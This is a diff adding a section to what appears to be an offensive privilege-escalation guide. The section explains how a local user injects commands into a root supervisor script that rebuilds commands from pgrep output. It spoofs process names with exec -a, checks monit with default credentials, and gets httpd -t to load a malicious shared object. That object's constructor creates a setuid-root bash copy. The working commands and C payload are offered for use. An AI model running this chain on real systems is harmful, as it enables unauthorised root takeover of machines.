@@ -156,6 +156,43 @@ Count the `..` levels against the consumer's base directory, and confirm with
 `git ls-tree -r` before pushing. Forges do not fsck incoming objects by default,
 so such a tree usually survives a push.
 
+A second recurring class in these root scripts is a command *rebuilt from a
+process's own command line*. A health-check or supervisor that does
+
+```bash
+while read pid cmdline; do cmd="${cmdline/foo/foo-variant} -flag"; $cmd; done \
+  <<< "$(pgrep -lfa '^/opt/app/bin/foo ')"
+```
+
+runs `$cmd` unquoted as root, and *you* control `cmdline` — any local user can
+launch a process with an arbitrary command line. Set it with `exec -a` so
+`/proc/<pid>/cmdline` matches the `pgrep` pattern and appends the arguments you
+want executed; use a do-nothing `int main(){for(;;)pause();}` binary as the exec
+target so there is no trailing argv junk:
+
+```bash
+setsid bash -c 'exec -a "/opt/app/bin/foo --serve -d /opt/app/conf -f /tmp/eve.conf" /tmp/forever' &
+```
+
+Supervisors are the common host: `monit` `check program` runs its script as root
+each cycle — read `/etc/monit/conf.d/*` (world-readable) and query the UI
+(`curl -u admin:monit http://127.0.0.1:2812/_status`) to see which checks are
+*active* before building anything. The lesson generalises past this exact sink:
+any root job that turns `ps`/`pgrep` output back into a command is injectable.
+
+When the injected command is a web/app server run in a *config-test* mode, the
+test still loads modules — `httpd -t` / `apachectl -t` processes `LoadModule`, so
+it `dlopen`s the named `.so` and runs its constructor as root. Weaponise by
+injecting `-f <your.conf>` (single-token args survive the unquoted word-split)
+pointing at a one-line `LoadModule x /tmp/e.so`; the `.so` is just
+
+```c
+__attribute__((constructor)) void go(void){ system("cp /bin/bash /tmp/.rb; chmod 4755 /tmp/.rb"); }
+```
+
+Compile natively on-target (`gcc -shared -fPIC -nostartfiles`), then `/tmp/.rb -p`.
+The constructor fires during the dlopen, before any "not a real module" error.
+
 ## Services and internal ports
 
 Something listening on 127.0.0.1 that is not exposed externally is usually
